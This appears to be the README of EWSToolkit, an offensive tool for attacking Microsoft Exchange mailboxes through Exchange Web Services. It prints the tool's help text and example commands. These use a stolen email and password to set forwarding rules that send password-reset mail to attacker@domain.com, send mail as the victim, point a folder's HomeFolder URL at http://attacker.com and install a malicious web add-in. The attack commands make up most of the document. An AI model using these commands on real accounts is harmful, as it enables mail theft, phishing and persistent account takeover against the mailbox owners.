# EWSToolkit

```text
C:\Users\dduggan>C:\Tools\EWSToolkit\EWSToolkit\bin\Debug\EWS.exe
 _____________      __  _________ ___________           .__   __   .__  __
 \_   _____/  \    /  \/   _____/ \__    ___/___   ____ |  | |  | _|__|/  |_
  |    __)_\   \/\/   /\_____  \    |    | /  _ \ /  _ \|  | |  |/ /  \   __\
  |        \\        / /        \   |    |(  <_> |  <_> )  |_|    <|  ||  |
 /_______  / \__/\  / /_______  /   |____| \____/ \____/|____/__|_ \__||__|
         \/       \/          \/                                  \/

                                                                      v0.1

  Options:
  -E, --Email=VALUE          Email address to authenticate with
  -P, --Password=VALUE       Password to authenticate with
      --rule                 Set auto-forwarding rules on users' mailbox
  -N, --Name=VALUE           Set a name for the rule
  -s, --subject=VALUE        Trigger on these strings in the mail Subject
  -b, --body=VALUE           Trigger on these strings in the mail Body
  -F, --Forward=VALUE        Email address to receive forwarded emails at
      --sendmail             Send an email an behalf of the current user
  -R, --Recipients=VALUE     Send email to
  -S, --Subject=VALUE        Email subject
  -T, --Template=VALUE       Email template file
  -t, --plaintext            Send email as plaintext, not HTML
  -a, --attachment=VALUE     Send an attachement
  -f, --from=VALUE           Send email from this account / mailbox
      --homefolder           Set a malicious URL on a folder
  -U, --Url=VALUE            URL to configure
      --installapp           Install a malicious Web Add-In
  -M, --Manifest=VALUE       Manifest to install
  -h, -?, --help             Show this help

  Uppercase parameters are mandatory for their respective functions.

  Examples:
  Set auto-forward rules
    ews -E user@domain.com -P Passw0rd! --rule -N TestRule -s password,reset -F attacker@domain.com
  Send email
    ews -E user@domain.com -P Passw0rd! --sendmail -R victim@domain.com -S "Hello" -T C:\Users\Rasta\Desktop\template.html
  Set HomeFolder URL
    ews -E user@domain.com -P Passw0rd! --homefolder -U http://attacker.com
  Install MailApp
    ews -E user@domain.com -P Passw0rd! --installapp -M C:\Users\Rasta\Desktop\manifest.xml
```

Also see related blog posts:  [https://rastamouse.me/tags/ews/](https://rastamouse.me/tags/ews/)